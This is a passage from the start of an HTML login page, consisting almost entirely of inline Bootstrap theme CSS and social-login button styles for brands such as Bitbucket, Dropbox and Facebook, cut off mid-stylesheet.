<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta name="description" content="">
    <meta name="author" content="">
    <link rel="icon" href="../../favicon.ico">

    <title>Login</title>

    <!-- Bootstrap core CSS -->
    <link href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" rel="stylesheet">
    <style>

 */.btn-default,.btn-primary,.btn-success,.btn-info,.btn-warning,.btn-danger{text-shadow:0 -1px 0 rgba(0,0,0,0.2);-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.15),0 1px 1px rgba(0,0,0,0.075);box-shadow:inset 0 1px 0 rgba(255,255,255,0.15),0 1px 1px rgba(0,0,0,0.075)}.btn-default:active,.btn-primary:active,.btn-success:active,.btn-info:active,.btn-warning:active,.btn-danger:active,.btn-default.active,.btn-primary.active,.btn-success.active,.btn-info.active,.btn-warning.active,.btn-danger.active{-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn-default.disabled,.btn-primary.disabled,.btn-success.disabled,.btn-info.disabled,.btn-warning.disabled,.btn-danger.disabled,.btn-default[disabled],.btn-primary[disabled],.btn-success[disabled],.btn-info[disabled],.btn-warning[disabled],.btn-danger[disabled],fieldset[disabled] .btn-default,fieldset[disabled] .btn-primary,fieldset[disabled] .btn-success,fieldset[disabled] .btn-info,fieldset[disabled] .btn-warning,fieldset[disabled] .btn-danger{-webkit-box-shadow:none;box-shadow:none}.btn-default .badge,.btn-primary .badge,.btn-success .badge,.btn-info .badge,.btn-warning .badge,.btn-danger .badge{text-shadow:none}.btn:active,.btn.active{background-image:none}.btn-default{background-image:-webkit-linear-gradient(top, #fff 0, #e0e0e0 100%);background-image:-o-linear-gradient(top, #fff 0, #e0e0e0 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #fff), to(#e0e0e0));background-image:linear-gradient(to bottom, #fff 0, #e0e0e0 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#ffe0e0e0', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);background-repeat:repeat-x;border-color:#dbdbdb;text-shadow:0 1px 0 #fff;border-color:#ccc}.btn-default:hover,.btn-default:focus{background-color:#e0e0e0;background-position:0 -15px}.btn-default:active,.btn-default.active{background-color:#e0e0e0;border-color:#dbdbdb}.btn-default.disabled,.btn-default[disabled],fieldset[disabled] .btn-default,.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus,.btn-default.disabled:active,.btn-default[disabled]:active,fieldset[disabled] .btn-default:active,.btn-default.disabled.active,.btn-default[disabled].active,fieldset[disabled] .btn-default.active{background-color:#e0e0e0;background-image:none}.btn-primary{background-image:-webkit-linear-gradient(top, #337ab7 0, #265a88 100%);background-image:-o-linear-gradient(top, #337ab7 0, #265a88 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #337ab7), to(#265a88));background-image:linear-gradient(to bottom, #337ab7 0, #265a88 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff265a88', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);background-repeat:repeat-x;border-color:#245580}.btn-primary:hover,.btn-primary:focus{background-color:#265a88;background-position:0 -15px}.btn-primary:active,.btn-primary.active{background-color:#265a88;border-color:#245580}.btn-primary.disabled,.btn-primary[disabled],fieldset[disabled] .btn-primary,.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus,.btn-primary.disabled:active,.btn-primary[disabled]:active,fieldset[disabled] .btn-primary:active,.btn-primary.disabled.active,.btn-primary[disabled].active,fieldset[disabled] .btn-primary.active{background-color:#265a88;background-image:none}.btn-success{background-image:-webkit-linear-gradient(top, #5cb85c 0, #419641 100%);background-image:-o-linear-gradient(top, #5cb85c 0, #419641 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #5cb85c), to(#419641));background-image:linear-gradient(to bottom, #5cb85c 0, #419641 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5cb85c', endColorstr='#ff419641', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);background-repeat:repeat-x;border-color:#3e8f3e}.btn-success:hover,.btn-success:focus{background-color:#419641;background-position:0 -15px}.btn-success:active,.btn-success.active{background-color:#419641;border-color:#3e8f3e}.btn-success.disabled,.btn-success[disabled],fieldset[disabled] .btn-success,.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus,.btn-success.disabled:active,.btn-success[disabled]:active,fieldset[disabled] .btn-success:active,.btn-success.disabled.active,.btn-success[disabled].active,fieldset[disabled] .btn-success.active{background-color:#419641;background-image:none}.btn-info{background-image:-webkit-linear-gradient(top, #5bc0de 0, #2aabd2 100%);background-image:-o-linear-gradient(top, #5bc0de 0, #2aabd2 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #5bc0de), to(#2aabd2));background-image:linear-gradient(to bottom, #5bc0de 0, #2aabd2 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de', endColorstr='#ff2aabd2', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);background-repeat:repeat-x;border-color:#28a4c9}.btn-info:hover,.btn-info:focus{background-color:#2aabd2;background-position:0 -15px}.btn-info:active,.btn-info.active{background-color:#2aabd2;border-color:#28a4c9}.btn-info.disabled,.btn-info[disabled],fieldset[disabled] .btn-info,.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus,.btn-info.disabled:active,.btn-info[disabled]:active,fieldset[disabled] .btn-info:active,.btn-info.disabled.active,.btn-info[disabled].active,fieldset[disabled] .btn-info.active{background-color:#2aabd2;background-image:none}.btn-warning{background-image:-webkit-linear-gradient(top, #f0ad4e 0, #eb9316 100%);background-image:-o-linear-gradient(top, #f0ad4e 0, #eb9316 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #f0ad4e), to(#eb9316));background-image:linear-gradient(to bottom, #f0ad4e 0, #eb9316 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff0ad4e', endColorstr='#ffeb9316', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);background-repeat:repeat-x;border-color:#e38d13}.btn-warning:hover,.btn-warning:focus{background-color:#eb9316;background-position:0 -15px}.btn-warning:active,.btn-warning.active{background-color:#eb9316;border-color:#e38d13}.btn-warning.disabled,.btn-warning[disabled],fieldset[disabled] .btn-warning,.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus,.btn-warning.disabled:active,.btn-warning[disabled]:active,fieldset[disabled] .btn-warning:active,.btn-warning.disabled.active,.btn-warning[disabled].active,fieldset[disabled] .btn-warning.active{background-color:#eb9316;background-image:none}.btn-danger{background-image:-webkit-linear-gradient(top, #d9534f 0, #c12e2a 100%);background-image:-o-linear-gradient(top, #d9534f 0, #c12e2a 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #d9534f), to(#c12e2a));background-image:linear-gradient(to bottom, #d9534f 0, #c12e2a 100%);filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9534f', endColorstr='#ffc12e2a', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);background-repeat:repeat-x;border-color:#b92c28}.btn-danger:hover,.btn-danger:focus{background-color:#c12e2a;background-position:0 -15px}.btn-danger:active,.btn-danger.active{background-color:#c12e2a;border-color:#b92c28}.btn-danger.disabled,.btn-danger[disabled],fieldset[disabled] .btn-danger,.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus,.btn-danger.disabled:active,.btn-danger[disabled]:active,fieldset[disabled] .btn-danger:active,.btn-danger.disabled.active,.btn-danger[disabled].active,fieldset[disabled] .btn-danger.active{background-color:#c12e2a;background-image:none}.thumbnail,.img-thumbnail{-webkit-box-shadow:0 1px 2px rgba(0,0,0,0.075);box-shadow:0 1px 2px rgba(0,0,0,0.075)}.dropdown-menu>li>a:hover,.dropdown-menu>li>a:focus{background-image:-webkit-linear-gradient(top, #f5f5f5 0, #e8e8e8 100%);background-image:-o-linear-gradient(top, #f5f5f5 0, #e8e8e8 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #f5f5f5), to(#e8e8e8));background-image:linear-gradient(to bottom, #f5f5f5 0, #e8e8e8 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5', endColorstr='#ffe8e8e8', GradientType=0);background-color:#e8e8e8}.dropdown-menu>.active>a,.dropdown-menu>.active>a:hover,.dropdown-menu>.active>a:focus{background-image:-webkit-linear-gradient(top, #337ab7 0, #2e6da4 100%);background-image:-o-linear-gradient(top, #337ab7 0, #2e6da4 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #337ab7), to(#2e6da4));background-image:linear-gradient(to bottom, #337ab7 0, #2e6da4 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2e6da4', GradientType=0);background-color:#2e6da4}.navbar-default{background-image:-webkit-linear-gradient(top, #fff 0, #f8f8f8 100%);background-image:-o-linear-gradient(top, #fff 0, #f8f8f8 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #fff), to(#f8f8f8));background-image:linear-gradient(to bottom, #fff 0, #f8f8f8 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffffffff', endColorstr='#fff8f8f8', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);border-radius:4px;-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.15),0 1px 5px rgba(0,0,0,0.075);box-shadow:inset 0 1px 0 rgba(255,255,255,0.15),0 1px 5px rgba(0,0,0,0.075)}.navbar-default .navbar-nav>.open>a,.navbar-default .navbar-nav>.active>a{background-image:-webkit-linear-gradient(top, #dbdbdb 0, #e2e2e2 100%);background-image:-o-linear-gradient(top, #dbdbdb 0, #e2e2e2 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #dbdbdb), to(#e2e2e2));background-image:linear-gradient(to bottom, #dbdbdb 0, #e2e2e2 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdbdbdb', endColorstr='#ffe2e2e2', GradientType=0);-webkit-box-shadow:inset 0 3px 9px rgba(0,0,0,0.075);box-shadow:inset 0 3px 9px rgba(0,0,0,0.075)}.navbar-brand,.navbar-nav>li>a{text-shadow:0 1px 0 rgba(255,255,255,0.25)}.navbar-inverse{background-image:-webkit-linear-gradient(top, #3c3c3c 0, #222 100%);background-image:-o-linear-gradient(top, #3c3c3c 0, #222 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #3c3c3c), to(#222));background-image:linear-gradient(to bottom, #3c3c3c 0, #222 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff3c3c3c', endColorstr='#ff222222', GradientType=0);filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);border-radius:4px}.navbar-inverse .navbar-nav>.open>a,.navbar-inverse .navbar-nav>.active>a{background-image:-webkit-linear-gradient(top, #080808 0, #0f0f0f 100%);background-image:-o-linear-gradient(top, #080808 0, #0f0f0f 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #080808), to(#0f0f0f));background-image:linear-gradient(to bottom, #080808 0, #0f0f0f 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff080808', endColorstr='#ff0f0f0f', GradientType=0);-webkit-box-shadow:inset 0 3px 9px rgba(0,0,0,0.25);box-shadow:inset 0 3px 9px rgba(0,0,0,0.25)}.navbar-inverse .navbar-brand,.navbar-inverse .navbar-nav>li>a{text-shadow:0 -1px 0 rgba(0,0,0,0.25)}.navbar-static-top,.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}@media (max-width:767px){.navbar .navbar-nav .open .dropdown-menu>.active>a,.navbar .navbar-nav .open .dropdown-menu>.active>a:hover,.navbar .navbar-nav .open .dropdown-menu>.active>a:focus{color:#fff;background-image:-webkit-linear-gradient(top, #337ab7 0, #2e6da4 100%);background-image:-o-linear-gradient(top, #337ab7 0, #2e6da4 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #337ab7), to(#2e6da4));background-image:linear-gradient(to bottom, #337ab7 0, #2e6da4 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2e6da4', GradientType=0)}}.alert{text-shadow:0 1px 0 rgba(255,255,255,0.2);-webkit-box-shadow:inset 0 1px 0 rgba(255,255,255,0.25),0 1px 2px rgba(0,0,0,0.05);box-shadow:inset 0 1px 0 rgba(255,255,255,0.25),0 1px 2px rgba(0,0,0,0.05)}.alert-success{background-image:-webkit-linear-gradient(top, #dff0d8 0, #c8e5bc 100%);background-image:-o-linear-gradient(top, #dff0d8 0, #c8e5bc 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #dff0d8), to(#c8e5bc));background-image:linear-gradient(to bottom, #dff0d8 0, #c8e5bc 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdff0d8', endColorstr='#ffc8e5bc', GradientType=0);border-color:#b2dba1}.alert-info{background-image:-webkit-linear-gradient(top, #d9edf7 0, #b9def0 100%);background-image:-o-linear-gradient(top, #d9edf7 0, #b9def0 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #d9edf7), to(#b9def0));background-image:linear-gradient(to bottom, #d9edf7 0, #b9def0 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9edf7', endColorstr='#ffb9def0', GradientType=0);border-color:#9acfea}.alert-warning{background-image:-webkit-linear-gradient(top, #fcf8e3 0, #f8efc0 100%);background-image:-o-linear-gradient(top, #fcf8e3 0, #f8efc0 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #fcf8e3), to(#f8efc0));background-image:linear-gradient(to bottom, #fcf8e3 0, #f8efc0 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffcf8e3', endColorstr='#fff8efc0', GradientType=0);border-color:#f5e79e}.alert-danger{background-image:-webkit-linear-gradient(top, #f2dede 0, #e7c3c3 100%);background-image:-o-linear-gradient(top, #f2dede 0, #e7c3c3 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #f2dede), to(#e7c3c3));background-image:linear-gradient(to bottom, #f2dede 0, #e7c3c3 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2dede', endColorstr='#ffe7c3c3', GradientType=0);border-color:#dca7a7}.progress{background-image:-webkit-linear-gradient(top, #ebebeb 0, #f5f5f5 100%);background-image:-o-linear-gradient(top, #ebebeb 0, #f5f5f5 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #ebebeb), to(#f5f5f5));background-image:linear-gradient(to bottom, #ebebeb 0, #f5f5f5 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffebebeb', endColorstr='#fff5f5f5', GradientType=0)}.progress-bar{background-image:-webkit-linear-gradient(top, #337ab7 0, #286090 100%);background-image:-o-linear-gradient(top, #337ab7 0, #286090 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #337ab7), to(#286090));background-image:linear-gradient(to bottom, #337ab7 0, #286090 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff286090', GradientType=0)}.progress-bar-success{background-image:-webkit-linear-gradient(top, #5cb85c 0, #449d44 100%);background-image:-o-linear-gradient(top, #5cb85c 0, #449d44 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #5cb85c), to(#449d44));background-image:linear-gradient(to bottom, #5cb85c 0, #449d44 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5cb85c', endColorstr='#ff449d44', GradientType=0)}.progress-bar-info{background-image:-webkit-linear-gradient(top, #5bc0de 0, #31b0d5 100%);background-image:-o-linear-gradient(top, #5bc0de 0, #31b0d5 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #5bc0de), to(#31b0d5));background-image:linear-gradient(to bottom, #5bc0de 0, #31b0d5 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff5bc0de', endColorstr='#ff31b0d5', GradientType=0)}.progress-bar-warning{background-image:-webkit-linear-gradient(top, #f0ad4e 0, #ec971f 100%);background-image:-o-linear-gradient(top, #f0ad4e 0, #ec971f 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #f0ad4e), to(#ec971f));background-image:linear-gradient(to bottom, #f0ad4e 0, #ec971f 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff0ad4e', endColorstr='#ffec971f', GradientType=0)}.progress-bar-danger{background-image:-webkit-linear-gradient(top, #d9534f 0, #c9302c 100%);background-image:-o-linear-gradient(top, #d9534f 0, #c9302c 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #d9534f), to(#c9302c));background-image:linear-gradient(to bottom, #d9534f 0, #c9302c 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9534f', endColorstr='#ffc9302c', GradientType=0)}.progress-bar-striped{background-image:-webkit-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:-o-linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent);background-image:linear-gradient(45deg, rgba(255,255,255,0.15) 25%, transparent 25%, transparent 50%, rgba(255,255,255,0.15) 50%, rgba(255,255,255,0.15) 75%, transparent 75%, transparent)}.list-group{border-radius:4px;-webkit-box-shadow:0 1px 2px rgba(0,0,0,0.075);box-shadow:0 1px 2px rgba(0,0,0,0.075)}.list-group-item.active,.list-group-item.active:hover,.list-group-item.active:focus{text-shadow:0 -1px 0 #286090;background-image:-webkit-linear-gradient(top, #337ab7 0, #2b669a 100%);background-image:-o-linear-gradient(top, #337ab7 0, #2b669a 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #337ab7), to(#2b669a));background-image:linear-gradient(to bottom, #337ab7 0, #2b669a 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2b669a', GradientType=0);border-color:#2b669a}.list-group-item.active .badge,.list-group-item.active:hover .badge,.list-group-item.active:focus .badge{text-shadow:none}.panel{-webkit-box-shadow:0 1px 2px rgba(0,0,0,0.05);box-shadow:0 1px 2px rgba(0,0,0,0.05)}.panel-default>.panel-heading{background-image:-webkit-linear-gradient(top, #f5f5f5 0, #e8e8e8 100%);background-image:-o-linear-gradient(top, #f5f5f5 0, #e8e8e8 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #f5f5f5), to(#e8e8e8));background-image:linear-gradient(to bottom, #f5f5f5 0, #e8e8e8 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff5f5f5', endColorstr='#ffe8e8e8', GradientType=0)}.panel-primary>.panel-heading{background-image:-webkit-linear-gradient(top, #337ab7 0, #2e6da4 100%);background-image:-o-linear-gradient(top, #337ab7 0, #2e6da4 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #337ab7), to(#2e6da4));background-image:linear-gradient(to bottom, #337ab7 0, #2e6da4 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ff337ab7', endColorstr='#ff2e6da4', GradientType=0)}.panel-success>.panel-heading{background-image:-webkit-linear-gradient(top, #dff0d8 0, #d0e9c6 100%);background-image:-o-linear-gradient(top, #dff0d8 0, #d0e9c6 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #dff0d8), to(#d0e9c6));background-image:linear-gradient(to bottom, #dff0d8 0, #d0e9c6 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffdff0d8', endColorstr='#ffd0e9c6', GradientType=0)}.panel-info>.panel-heading{background-image:-webkit-linear-gradient(top, #d9edf7 0, #c4e3f3 100%);background-image:-o-linear-gradient(top, #d9edf7 0, #c4e3f3 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #d9edf7), to(#c4e3f3));background-image:linear-gradient(to bottom, #d9edf7 0, #c4e3f3 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffd9edf7', endColorstr='#ffc4e3f3', GradientType=0)}.panel-warning>.panel-heading{background-image:-webkit-linear-gradient(top, #fcf8e3 0, #faf2cc 100%);background-image:-o-linear-gradient(top, #fcf8e3 0, #faf2cc 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #fcf8e3), to(#faf2cc));background-image:linear-gradient(to bottom, #fcf8e3 0, #faf2cc 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fffcf8e3', endColorstr='#fffaf2cc', GradientType=0)}.panel-danger>.panel-heading{background-image:-webkit-linear-gradient(top, #f2dede 0, #ebcccc 100%);background-image:-o-linear-gradient(top, #f2dede 0, #ebcccc 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #f2dede), to(#ebcccc));background-image:linear-gradient(to bottom, #f2dede 0, #ebcccc 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#fff2dede', endColorstr='#ffebcccc', GradientType=0)}.well{background-image:-webkit-linear-gradient(top, #e8e8e8 0, #f5f5f5 100%);background-image:-o-linear-gradient(top, #e8e8e8 0, #f5f5f5 100%);background-image:-webkit-gradient(linear, left top, left bottom, color-stop(0, #e8e8e8), to(#f5f5f5));background-image:linear-gradient(to bottom, #e8e8e8 0, #f5f5f5 100%);background-repeat:repeat-x;filter:progid:DXImageTransform.Microsoft.gradient(startColorstr='#ffe8e8e8', endColorstr='#fff5f5f5', GradientType=0);border-color:#dcdcdc;-webkit-box-shadow:inset 0 1px 3px rgba(0,0,0,0.05),0 1px 0 rgba(255,255,255,0.1);box-shadow:inset 0 1px 3px rgba(0,0,0,0.05),0 1px 0 rgba(255,255,255,0.1)} 
    </style>    
    <link rel="stylesheet" href="style.3.css">

    <style>
    @import url(https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css);.btn-social,button.nextbtn,form{position:relative}.btn-social,.btn-social-icon{white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.btn-bitbucket.active,.btn-bitbucket:active,.btn-dropbox.active,.btn-dropbox:active,.btn-facebook.active,.btn-facebook:active,.btn-flickr.active,.btn-flickr:active,.btn-github.active,.btn-github:active,.btn-instagram.active,.btn-instagram:active,.btn-linkedin.active,.btn-linkedin:active,.btn-pinterest.active,.btn-pinterest:active,.btn-tumblr.active,.btn-tumblr:active,.btn-twitter.active,.btn-twitter:active,.btn-vk.active,.btn-vk:active,.open .dropdown-toggle.btn-bitbucket,.open .dropdown-toggle.btn-dropbox,.open .dropdown-toggle.btn-facebook,.open .dropdown-toggle.btn-flickr,.open .dropdown-toggle.btn-github,.open .dropdown-toggle.btn-instagram,.open .dropdown-toggle.btn-linkedin,.open .dropdown-toggle.btn-pinterest,.open .dropdown-toggle.btn-tumblr,.open .dropdown-toggle.btn-twitter,.open .dropdown-toggle.btn-vk{background-image:none}form{width:24vw;margin:auto auto auto -12vw;top:33vh;right:39px;float:right}.btn-social-icon,.social-class li{margin-bottom:4px}button.nextbtn{top:20px;background-color:#188fff;border-radius:3px;font-size:15px;border:none;color:#fff;font-weight:600}.btn-social{padding-left:44px;text-align:left}.btn-social :first-child{position:absolute;left:0;top:0;bottom:0;width:32px;line-height:34px;font-size:1.6em;text-align:center;border-right:1px solid rgba(0,0,0,.2)}.btn-social.btn-lg{padding-left:61px}.btn-social.btn-lg :first-child{line-height:45px;width:45px;font-size:1.8em}.btn-social.btn-sm{padding-left:38px}.btn-social.btn-sm :first-child{line-height:28px;width:28px;font-size:1.4em}.btn-social.btn-xs{padding-left:30px}.btn-social-icon,.btn-social-icon.btn-lg,.btn-social-icon.btn-sm,.btn-social-icon.btn-xs{padding-left:0;padding-right:0}.btn-social.btn-xs :first-child{line-height:20px;width:20px;font-size:1.2em}.btn-social-icon{position:relative;text-align:left;height:34px;width:34px}.btn-social-icon :first-child{position:absolute;left:0;top:0;bottom:0;line-height:34px;font-size:1.6em}.btn-social-icon.btn-lg :first-child{line-height:45px;width:45px;font-size:1.8em}.btn-social-icon.btn-sm :first-child{line-height:28px;width:28px;font-size:1.4em}.btn-social-icon.btn-xs :first-child{line-height:20px;width:20px;font-size:1.2em}.btn-social-icon :first-child{border:none;text-align:center;width:100%!important}.btn-social-icon.btn-lg{height:45px;width:45px}.btn-social-icon.btn-sm{height:30px;width:30px}.btn-social-icon.btn-xs{height:22px;width:22px}.btn-bitbucket{color:#fff;background-color:#205081;border-color:rgba(0,0,0,.2)}.btn-bitbucket.active,.btn-bitbucket:active,.btn-bitbucket:focus,.btn-bitbucket:hover,.open .dropdown-toggle.btn-bitbucket{color:#fff;background-color:#183c60;border-color:rgba(0,0,0,.2)}.btn-bitbucket.disabled,.btn-bitbucket.disabled.active,.btn-bitbucket.disabled:active,.btn-bitbucket.disabled:focus,.btn-bitbucket.disabled:hover,.btn-bitbucket[disabled],.btn-bitbucket[disabled].active,.btn-bitbucket[disabled]:active,.btn-bitbucket[disabled]:focus,.btn-bitbucket[disabled]:hover,fieldset[disabled] .btn-bitbucket,fieldset[disabled] .btn-bitbucket.active,fieldset[disabled] .btn-bitbucket:active,fieldset[disabled] .btn-bitbucket:focus,fieldset[disabled] .btn-bitbucket:hover{background-color:#205081;border-color:rgba(0,0,0,.2)}.btn-dropbox{color:#fff;background-color:#1087dd;border-color:rgba(0,0,0,.2)}.btn-dropbox.active,.btn-dropbox:active,.btn-dropbox:focus,.btn-dropbox:hover,.open .dropdown-toggle.btn-dropbox{color:#fff;background-color:#0d70b7;border-color:rgba(0,0,0,.2)}.btn-dropbox.disabled,.btn-dropbox.disabled.active,.btn-dropbox.disabled:active,.btn-dropbox.disabled:focus,.btn-dropbox.disabled:hover,.btn-dropbox[disabled],.btn-dropbox[disabled].active,.btn-dropbox[disabled]:active,.btn-dropbox[disabled]:focus,.btn-dropbox[disabled]:hover,fieldset[disabled] .btn-dropbox,fieldset[disabled] .btn-dropbox.active,fieldset[disabled] .btn-dropbox:active,fieldset[disabled] .btn-dropbox:focus,fieldset[disabled] .btn-dropbox:hover{background-color:#1087dd;border-color:rgba(0,0,0,.2)}.btn-facebook{color:#fff;background-color:#3b5998;border-color:rgba(0,0,0,.2)}.btn-facebook.active,.btn-facebook:active,.btn-facebook:focus,.btn-facebook:hover,.open .dropdown-toggle.btn-facebook{color:#fff;background-color:#30487b;border-color:rgba(0,0,0,.2)}.btn-facebook.disabled,.btn-facebook.disabled.active,.btn-facebook.disabled:active,.btn-facebook.disabled:focus,.btn-facebook.disabled:hover,.btn-facebook[disabled],.btn-facebook[disabled].active,.btn-facebook[disabled]:active,.btn-facebook[disabled]:focus,.btn-facebook[disabled]:hover,fieldset[disabled] .btn-facebook,fieldset[disabled] .btn-facebook.active,fieldset[disabled] .btn-facebook:active,fieldset[disabled] .btn-facebook:focus,fieldset[disabled] .btn-facebook:hover{background-color:#3b5998;border-color:rgba(0,0,0,.2)}.btn-flickr{color:#fff;background-color:#ff0084;border-color:rgba(0,0,0,.2)}.btn-flickr.active,.btn-flickr:active,.btn-flickr:focus,.btn-flickr:hover,.open 